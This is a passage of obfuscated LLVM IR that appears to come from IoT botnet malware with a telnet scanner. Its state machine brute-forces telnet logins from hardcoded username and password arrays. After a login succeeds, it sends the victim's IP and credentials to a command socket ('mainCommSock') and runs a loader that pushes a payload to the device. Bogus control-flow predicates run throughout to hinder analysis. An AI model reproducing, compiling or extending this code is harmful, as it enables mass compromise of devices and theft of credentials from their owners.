  %2626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2625, i32 0, i32 8
  %2627 = load i8*, i8** %2626, align 8
  %2628 = call i8* @strstr(i8* %2627, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %2629 = icmp ne i8* %2628, null
  br i1 %2629, label %2630, label %2650

; <label>:2630:                                   ; preds = %2614
  %2631 = load i32, i32* %10, align 4
  %2632 = sext i32 %2631 to i64
  %2633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2632
  %2634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2633, i32 0, i32 8
  %2635 = load i8*, i8** %2634, align 8
  call void @llvm.memset.p0i8.i64(i8* %2635, i8 0, i64 1024, i32 1, i1 false)
  %2636 = load i32, i32* %10, align 4
  %2637 = sext i32 %2636 to i64
  %2638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2637
  %2639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2638, i32 0, i32 0
  %2640 = load i32, i32* %2639, align 16
  %2641 = call i32 @sclose(i32 %2640)
  %2642 = load i32, i32* %10, align 4
  %2643 = sext i32 %2642 to i64
  %2644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2643
  %2645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2644, i32 0, i32 2
  store i8 0, i8* %2645, align 8
  %2646 = load i32, i32* %10, align 4
  %2647 = sext i32 %2646 to i64
  %2648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2647
  %2649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2648, i32 0, i32 3
  store i8 0, i8* %2649, align 1
  br label %3344

; <label>:2650:                                   ; preds = %2614
  %2651 = load i32, i32* %10, align 4
  %2652 = sext i32 %2651 to i64
  %2653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2652
  %2654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2653, i32 0, i32 2
  store i8 7, i8* %2654, align 8
  br label %2655

; <label>:2655:                                   ; preds = %2650
  %2656 = load i32, i32* %10, align 4
  %2657 = sext i32 %2656 to i64
  %2658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2657
  %2659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2658, i32 0, i32 8
  %2660 = load i8*, i8** %2659, align 8
  call void @llvm.memset.p0i8.i64(i8* %2660, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:2661:                                   ; preds = %originalBBpart2284
  %2662 = load i32, i32* @x.67
  %2663 = load i32, i32* @y.68
  %2664 = sub i32 %2662, 1
  %2665 = mul i32 %2662, %2664
  %2666 = urem i32 %2665, 2
  %2667 = icmp eq i32 %2666, 0
  %2668 = icmp slt i32 %2663, 10
  %2669 = or i1 %2667, %2668
  br i1 %2669, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2661
  %2670 = load i32, i32* %10, align 4
  %2671 = sext i32 %2670 to i64
  %2672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2671
  %2673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2672, i32 0, i32 0
  %2674 = load i32, i32* %2673, align 16
  %2675 = load i32, i32* %10, align 4
  %2676 = sext i32 %2675 to i64
  %2677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2676
  %2678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2677, i32 0, i32 8
  %2679 = load i8*, i8** %2678, align 8
  %2680 = load i32, i32* %10, align 4
  %2681 = sext i32 %2680 to i64
  %2682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2681
  %2683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2682, i32 0, i32 7
  %2684 = load i16, i16* %2683, align 16
  %2685 = zext i16 %2684 to i32
  %2686 = call i32 @readUntil(i32 %2674, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2679, i32 1024, i32 %2685)
  %2687 = icmp ne i32 %2686, 0
  %2688 = load i32, i32* @x.67
  %2689 = load i32, i32* @y.68
  %2690 = sub i32 %2688, 1
  %2691 = mul i32 %2688, %2690
  %2692 = urem i32 %2691, 2
  %2693 = icmp eq i32 %2692, 0
  %2694 = icmp slt i32 %2689, 10
  %2695 = or i1 %2693, %2694
  br i1 %2695, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %2687, label %2696, label %2743

; <label>:2696:                                   ; preds = %originalBBpart2288
  %2697 = load i32, i32* %10, align 4
  %2698 = sext i32 %2697 to i64
  %2699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2698
  %2700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2699, i32 0, i32 6
  store i32 0, i32* %2700, align 4
  %2701 = load i32, i32* %10, align 4
  %2702 = sext i32 %2701 to i64
  %2703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2702
  %2704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2703, i32 0, i32 7
  store i16 0, i16* %2704, align 16
  %2705 = load i32, i32* %10, align 4
  %2706 = sext i32 %2705 to i64
  %2707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2706
  %2708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2707, i32 0, i32 8
  %2709 = load i8*, i8** %2708, align 8
  %2710 = call i8* @strstr(i8* %2709, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %2711 = icmp ne i8* %2710, null
  br i1 %2711, label %2712, label %2732

; <label>:2712:                                   ; preds = %2696
  %2713 = load i32, i32* %10, align 4
  %2714 = sext i32 %2713 to i64
  %2715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2714
  %2716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2715, i32 0, i32 8
  %2717 = load i8*, i8** %2716, align 8
  call void @llvm.memset.p0i8.i64(i8* %2717, i8 0, i64 1024, i32 1, i1 false)
  %2718 = load i32, i32* %10, align 4
  %2719 = sext i32 %2718 to i64
  %2720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2719
  %2721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2720, i32 0, i32 0
  %2722 = load i32, i32* %2721, align 16
  %2723 = call i32 @sclose(i32 %2722)
  %2724 = load i32, i32* %10, align 4
  %2725 = sext i32 %2724 to i64
  %2726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2725
  %2727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2726, i32 0, i32 2
  store i8 0, i8* %2727, align 8
  %2728 = load i32, i32* %10, align 4
  %2729 = sext i32 %2728 to i64
  %2730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2729
  %2731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2730, i32 0, i32 3
  store i8 0, i8* %2731, align 1
  br label %3344

; <label>:2732:                                   ; preds = %2696
  %2733 = load i32, i32* %10, align 4
  %2734 = sext i32 %2733 to i64
  %2735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2734
  %2736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2735, i32 0, i32 2
  store i8 7, i8* %2736, align 8
  br label %2737

; <label>:2737:                                   ; preds = %2732
  %2738 = load i32, i32* %10, align 4
  %2739 = sext i32 %2738 to i64
  %2740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2739
  %2741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2740, i32 0, i32 8
  %2742 = load i8*, i8** %2741, align 8
  call void @llvm.memset.p0i8.i64(i8* %2742, i8 0, i64 1024, i32 1, i1 false)
  br label %3344

; <label>:2743:                                   ; preds = %originalBBpart2288
  %2744 = load i32, i32* %10, align 4
  %2745 = sext i32 %2744 to i64
  %2746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2745
  %2747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2746, i32 0, i32 8
  %2748 = load i8*, i8** %2747, align 8
  %2749 = call i64 @strlen(i8* %2748) #10
  %2750 = trunc i64 %2749 to i16
  %2751 = load i32, i32* %10, align 4
  %2752 = sext i32 %2751 to i64
  %2753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2752
  %2754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2753, i32 0, i32 7
  store i16 %2750, i16* %2754, align 16
  br label %2755

; <label>:2755:                                   ; preds = %2743
  %2756 = load i32, i32* @x.67
  %2757 = load i32, i32* @y.68
  %2758 = sub i32 %2756, 1
  %2759 = mul i32 %2756, %2758
  %2760 = urem i32 %2759, 2
  %2761 = icmp eq i32 %2760, 0
  %2762 = icmp slt i32 %2757, 10
  %2763 = or i1 %2761, %2762
  br i1 %2763, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2755
  %2764 = load i32, i32* %10, align 4
  %2765 = sext i32 %2764 to i64
  %2766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2765
  %2767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2766, i32 0, i32 6
  %2768 = load i32, i32* %2767, align 4
  %2769 = add i32 %2768, 10
  %2770 = zext i32 %2769 to i64
  %2771 = call i64 @time(i64* null) #2
  %2772 = icmp slt i64 %2770, %2771
  %2773 = load i32, i32* @x.67
  %2774 = load i32, i32* @y.68
  %2775 = sub i32 %2773, 1
  %2776 = mul i32 %2773, %2775
  %2777 = urem i32 %2776, 2
  %2778 = icmp eq i32 %2777, 0
  %2779 = icmp slt i32 %2774, 10
  %2780 = or i1 %2778, %2779
  br i1 %2780, label %originalBBpart2304, label %originalBB290alteredBB

originalBBpart2304:                               ; preds = %originalBB290
  br i1 %2772, label %2781, label %2812

; <label>:2781:                                   ; preds = %originalBBpart2304
  %2782 = load i32, i32* @x.67
  %2783 = load i32, i32* @y.68
  %2784 = sub i32 %2782, 1
  %2785 = mul i32 %2782, %2784
  %2786 = urem i32 %2785, 2
  %2787 = icmp eq i32 %2786, 0
  %2788 = icmp slt i32 %2783, 10
  %2789 = or i1 %2787, %2788
  br i1 %2789, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2781
  %2790 = load i32, i32* %10, align 4
  %2791 = sext i32 %2790 to i64
  %2792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2791
  %2793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2792, i32 0, i32 0
  %2794 = load i32, i32* %2793, align 16
  %2795 = call i32 @sclose(i32 %2794)
  %2796 = load i32, i32* %10, align 4
  %2797 = sext i32 %2796 to i64
  %2798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2797
  %2799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2798, i32 0, i32 2
  store i8 0, i8* %2799, align 8
  %2800 = load i32, i32* %10, align 4
  %2801 = sext i32 %2800 to i64
  %2802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2801
  %2803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2802, i32 0, i32 3
  store i8 1, i8* %2803, align 1
  %2804 = load i32, i32* @x.67
  %2805 = load i32, i32* @y.68
  %2806 = sub i32 %2804, 1
  %2807 = mul i32 %2804, %2806
  %2808 = urem i32 %2807, 2
  %2809 = icmp eq i32 %2808, 0
  %2810 = icmp slt i32 %2805, 10
  %2811 = or i1 %2809, %2810
  br i1 %2811, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br label %2812

; <label>:2812:                                   ; preds = %originalBBpart2308, %originalBBpart2304
  br label %3327

; <label>:2813:                                   ; preds = %101
  %2814 = load i32, i32* %10, align 4
  %2815 = sext i32 %2814 to i64
  %2816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2815
  %2817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2816, i32 0, i32 0
  %2818 = load i32, i32* %2817, align 16
  %2819 = call i64 @send(i32 %2818, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %2820 = icmp slt i64 %2819, 0
  br i1 %2820, label %2821, label %2836

; <label>:2821:                                   ; preds = %2813
  %2822 = load i32, i32* %10, align 4
  %2823 = sext i32 %2822 to i64
  %2824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2823
  %2825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2824, i32 0, i32 0
  %2826 = load i32, i32* %2825, align 16
  %2827 = call i32 @sclose(i32 %2826)
  %2828 = load i32, i32* %10, align 4
  %2829 = sext i32 %2828 to i64
  %2830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2829
  %2831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2830, i32 0, i32 2
  store i8 0, i8* %2831, align 8
  %2832 = load i32, i32* %10, align 4
  %2833 = sext i32 %2832 to i64
  %2834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2833
  %2835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2834, i32 0, i32 3
  store i8 1, i8* %2835, align 1
  br label %3344

; <label>:2836:                                   ; preds = %2813
  %2837 = load i32, i32* %10, align 4
  %2838 = sext i32 %2837 to i64
  %2839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2838
  %2840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2839, i32 0, i32 2
  store i8 8, i8* %2840, align 8
  br label %3327

; <label>:2841:                                   ; preds = %101
  %2842 = load i32, i32* @x.67
  %2843 = load i32, i32* @y.68
  %2844 = sub i32 %2842, 1
  %2845 = mul i32 %2842, %2844
  %2846 = urem i32 %2845, 2
  %2847 = icmp eq i32 %2846, 0
  %2848 = icmp slt i32 %2843, 10
  %2849 = or i1 %2847, %2848
  br i1 %2849, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2841
  %2850 = load i32, i32* %10, align 4
  %2851 = sext i32 %2850 to i64
  %2852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2851
  %2853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2852, i32 0, i32 0
  %2854 = load i32, i32* %2853, align 16
  %2855 = call i64 @send(i32 %2854, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i64 7, i32 16384)
  %2856 = icmp slt i64 %2855, 0
  %2857 = load i32, i32* @x.67
  %2858 = load i32, i32* @y.68
  %2859 = sub i32 %2857, 1
  %2860 = mul i32 %2857, %2859
  %2861 = urem i32 %2860, 2
  %2862 = icmp eq i32 %2861, 0
  %2863 = icmp slt i32 %2858, 10
  %2864 = or i1 %2862, %2863
  br i1 %2864, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %2856, label %2865, label %2896

; <label>:2865:                                   ; preds = %originalBBpart2312
  %2866 = load i32, i32* @x.67
  %2867 = load i32, i32* @y.68
  %2868 = sub i32 %2866, 1
  %2869 = mul i32 %2866, %2868
  %2870 = urem i32 %2869, 2
  %2871 = icmp eq i32 %2870, 0
  %2872 = icmp slt i32 %2867, 10
  %2873 = or i1 %2871, %2872
  br i1 %2873, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2865
  %2874 = load i32, i32* %10, align 4
  %2875 = sext i32 %2874 to i64
  %2876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2875
  %2877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2876, i32 0, i32 0
  %2878 = load i32, i32* %2877, align 16
  %2879 = call i32 @sclose(i32 %2878)
  %2880 = load i32, i32* %10, align 4
  %2881 = sext i32 %2880 to i64
  %2882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2881
  %2883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2882, i32 0, i32 2
  store i8 0, i8* %2883, align 8
  %2884 = load i32, i32* %10, align 4
  %2885 = sext i32 %2884 to i64
  %2886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2885
  %2887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2886, i32 0, i32 3
  store i8 1, i8* %2887, align 1
  %2888 = load i32, i32* @x.67
  %2889 = load i32, i32* @y.68
  %2890 = sub i32 %2888, 1
  %2891 = mul i32 %2888, %2890
  %2892 = urem i32 %2891, 2
  %2893 = icmp eq i32 %2892, 0
  %2894 = icmp slt i32 %2889, 10
  %2895 = or i1 %2893, %2894
  br i1 %2895, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br label %3344

; <label>:2896:                                   ; preds = %originalBBpart2312
  %2897 = load i32, i32* @x.67
  %2898 = load i32, i32* @y.68
  %2899 = sub i32 %2897, 1
  %2900 = mul i32 %2897, %2899
  %2901 = urem i32 %2900, 2
  %2902 = icmp eq i32 %2901, 0
  %2903 = icmp slt i32 %2898, 10
  %2904 = or i1 %2902, %2903
  br i1 %2904, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2896
  %2905 = load i32, i32* %10, align 4
  %2906 = sext i32 %2905 to i64
  %2907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2906
  %2908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2907, i32 0, i32 2
  store i8 9, i8* %2908, align 8
  %2909 = load i32, i32* @x.67
  %2910 = load i32, i32* @y.68
  %2911 = sub i32 %2909, 1
  %2912 = mul i32 %2909, %2911
  %2913 = urem i32 %2912, 2
  %2914 = icmp eq i32 %2913, 0
  %2915 = icmp slt i32 %2910, 10
  %2916 = or i1 %2914, %2915
  br i1 %2916, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br label %3327

; <label>:2917:                                   ; preds = %101
  %2918 = load i32, i32* %10, align 4
  %2919 = sext i32 %2918 to i64
  %2920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2919
  %2921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2920, i32 0, i32 0
  %2922 = load i32, i32* %2921, align 16
  %2923 = call i64 @send(i32 %2922, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2924 = icmp slt i64 %2923, 0
  br i1 %2924, label %2925, label %2940

; <label>:2925:                                   ; preds = %2917
  %2926 = load i32, i32* %10, align 4
  %2927 = sext i32 %2926 to i64
  %2928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2927
  %2929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2928, i32 0, i32 0
  %2930 = load i32, i32* %2929, align 16
  %2931 = call i32 @sclose(i32 %2930)
  %2932 = load i32, i32* %10, align 4
  %2933 = sext i32 %2932 to i64
  %2934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2933
  %2935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2934, i32 0, i32 2
  store i8 0, i8* %2935, align 8
  %2936 = load i32, i32* %10, align 4
  %2937 = sext i32 %2936 to i64
  %2938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2937
  %2939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2938, i32 0, i32 3
  store i8 1, i8* %2939, align 1
  br label %3344

; <label>:2940:                                   ; preds = %2917
  %2941 = load i32, i32* @x.67
  %2942 = load i32, i32* @y.68
  %2943 = sub i32 %2941, 1
  %2944 = mul i32 %2941, %2943
  %2945 = urem i32 %2944, 2
  %2946 = icmp eq i32 %2945, 0
  %2947 = icmp slt i32 %2942, 10
  %2948 = or i1 %2946, %2947
  br i1 %2948, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2940
  %2949 = load i32, i32* @mainCommSock, align 4
  %2950 = load i32, i32* %10, align 4
  %2951 = sext i32 %2950 to i64
  %2952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2951
  %2953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2952, i32 0, i32 1
  %2954 = bitcast i32* %2953 to %struct.in_addr*
  %2955 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2954, i32 0, i32 0
  %2956 = load i32, i32* %2955, align 4
  %2957 = call i8* @inet_ntoa(i32 %2956) #2
  %2958 = load i32, i32* %10, align 4
  %2959 = sext i32 %2958 to i64
  %2960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2959
  %2961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2960, i32 0, i32 4
  %2962 = load i8, i8* %2961, align 2
  %2963 = zext i8 %2962 to i64
  %2964 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2963
  %2965 = load i8*, i8** %2964, align 8
  %2966 = load i32, i32* %10, align 4
  %2967 = sext i32 %2966 to i64
  %2968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2967
  %2969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2968, i32 0, i32 5
  %2970 = load i8, i8* %2969, align 1
  %2971 = zext i8 %2970 to i64
  %2972 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2971
  %2973 = load i8*, i8** %2972, align 8
  %2974 = call i32 (i32, i8*, ...) @sockprintf(i32 %2949, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2957, i8* %2965, i8* %2973)
  %2975 = load i32, i32* %10, align 4
  %2976 = sext i32 %2975 to i64
  %2977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2976
  %2978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2977, i32 0, i32 2
  store i8 10, i8* %2978, align 8
  %2979 = load i32, i32* @x.67
  %2980 = load i32, i32* @y.68
  %2981 = sub i32 %2979, 1
  %2982 = mul i32 %2979, %2981
  %2983 = urem i32 %2982, 2
  %2984 = icmp eq i32 %2983, 0
  %2985 = icmp slt i32 %2980, 10
  %2986 = or i1 %2984, %2985
  br i1 %2986, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %3327

; <label>:2987:                                   ; preds = %101
  call void @echoLoader()
  %2988 = load i32, i32* %10, align 4
  %2989 = sext i32 %2988 to i64
  %2990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2989
  %2991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2990, i32 0, i32 0
  %2992 = load i32, i32* %2991, align 16
  %2993 = call i64 @send(i32 %2992, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i32 0, i32 0), i64 61, i32 16384)
  %2994 = load i32, i32* %10, align 4
  %2995 = sext i32 %2994 to i64
  %2996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2995
  %2997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2996, i32 0, i32 2
  store i8 11, i8* %2997, align 8
  br label %3327

; <label>:2998:                                   ; preds = %101
  %2999 = load i32, i32* @x.67
  %3000 = load i32, i32* @y.68
  %3001 = sub i32 %2999, 1
  %3002 = mul i32 %2999, %3001
  %3003 = urem i32 %3002, 2
  %3004 = icmp eq i32 %3003, 0
  %3005 = icmp slt i32 %3000, 10
  %3006 = or i1 %3004, %3005
  br i1 %3006, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2998
  %3007 = load i32, i32* %10, align 4
  %3008 = sext i32 %3007 to i64
  %3009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3008
  %3010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3009, i32 0, i32 0
  %3011 = load i32, i32* %3010, align 16
  %3012 = call i64 @send(i32 %3011, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i32 0, i32 0), i64 49, i32 16384)
  %3013 = icmp slt i64 %3012, 0
  %3014 = load i32, i32* @x.67
  %3015 = load i32, i32* @y.68
  %3016 = sub i32 %3014, 1
  %3017 = mul i32 %3014, %3016
  %3018 = urem i32 %3017, 2
  %3019 = icmp eq i32 %3018, 0
  %3020 = icmp slt i32 %3015, 10
  %3021 = or i1 %3019, %3020
  br i1 %3021, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %3013, label %3022, label %3037

; <label>:3022:                                   ; preds = %originalBBpart2328
  %3023 = load i32, i32* %10, align 4
  %3024 = sext i32 %3023 to i64
  %3025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3024
  %3026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3025, i32 0, i32 0
  %3027 = load i32, i32* %3026, align 16
  %3028 = call i32 @sclose(i32 %3027)
  %3029 = load i32, i32* %10, align 4
  %3030 = sext i32 %3029 to i64
  %3031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3030
  %3032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3031, i32 0, i32 2
  store i8 0, i8* %3032, align 8
  %3033 = load i32, i32* %10, align 4
  %3034 = sext i32 %3033 to i64
  %3035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3034
  %3036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3035, i32 0, i32 3
  store i8 1, i8* %3036, align 1
  br label %3344

; <label>:3037:                                   ; preds = %originalBBpart2328
  %3038 = load i32, i32* %10, align 4
  %3039 = sext i32 %3038 to i64
  %3040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3039
  %3041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3040, i32 0, i32 2
  store i8 12, i8* %3041, align 8
  br label %3042

; <label>:3042:                                   ; preds = %3037, %101
  %3043 = load i32, i32* %10, align 4
  %3044 = sext i32 %3043 to i64
  %3045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3044
  %3046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3045, i32 0, i32 6
  %3047 = load i32, i32* %3046, align 4
  %3048 = icmp eq i32 %3047, 0
  br i1 %3048, label %3049, label %3056

; <label>:3049:                                   ; preds = %3042
  %3050 = call i64 @time(i64* null) #2
  %3051 = trunc i64 %3050 to i32
  %3052 = load i32, i32* %10, align 4
  %3053 = sext i32 %3052 to i64
  %3054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3053
  %3055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3054, i32 0, i32 6
  store i32 %3051, i32* %3055, align 4
  br label %3056

; <label>:3056:                                   ; preds = %3049, %3042
  %3057 = load i32, i32* %10, align 4
  %3058 = sext i32 %3057 to i64
  %3059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3058
  %3060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3059, i32 0, i32 0
  %3061 = load i32, i32* %3060, align 16
  %3062 = load i32, i32* %10, align 4
  %3063 = sext i32 %3062 to i64
  %3064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3063
  %3065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3064, i32 0, i32 8
  %3066 = load i8*, i8** %3065, align 8
  %3067 = load i32, i32* %10, align 4
  %3068 = sext i32 %3067 to i64
  %3069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3068
  %3070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3069, i32 0, i32 7
  %3071 = load i16, i16* %3070, align 16
  %3072 = zext i16 %3071 to i32
  %3073 = call i32 @readUntil(i32 %3061, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3066, i32 1024, i32 %3072)
  %3074 = icmp ne i32 %3073, 0
  br i1 %3074, label %3075, label %3116

; <label>:3075:                                   ; preds = %3056
  %3076 = load i32, i32* %10, align 4
  %3077 = sext i32 %3076 to i64
  %3078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3077
  %3079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3078, i32 0, i32 6
  store i32 0, i32* %3079, align 4
  %3080 = load i32, i32* %10, align 4
  %3081 = sext i32 %3080 to i64
  %3082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3081
  %3083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3082, i32 0, i32 7
  store i16 0, i16* %3083, align 16
  %3084 = load i32, i32* %10, align 4
  %3085 = sext i32 %3084 to i64
  %3086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3085
  %3087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3086, i32 0, i32 0
  %3088 = load i32, i32* %3087, align 16
